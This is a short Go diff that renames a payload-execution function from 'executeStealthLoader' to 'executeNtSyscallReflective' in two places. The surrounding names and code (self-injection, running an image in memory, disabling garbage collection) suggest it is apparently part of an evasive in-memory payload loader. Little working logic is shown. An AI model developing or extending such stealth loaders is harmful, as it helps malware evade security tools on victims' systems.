@@ -24,7 +24,7 @@ func executeSelfInjection(payload []byte) {
 	selfRunImage(img)
 }
 
-func executeStealthLoader(payload []byte) {
+func executeNtSyscallReflective(payload []byte) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 	prevGC := debug.SetGCPercent(-1)
@@ -390,7 +390,7 @@ func executeSelfInjection(payload []byte) {
 	selfRunImage32(img)
 }
 
-func executeStealthLoader(payload []byte) {
+func executeNtSyscallReflective(payload []byte) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 	prevGC := debug.SetGCPercent(-1)
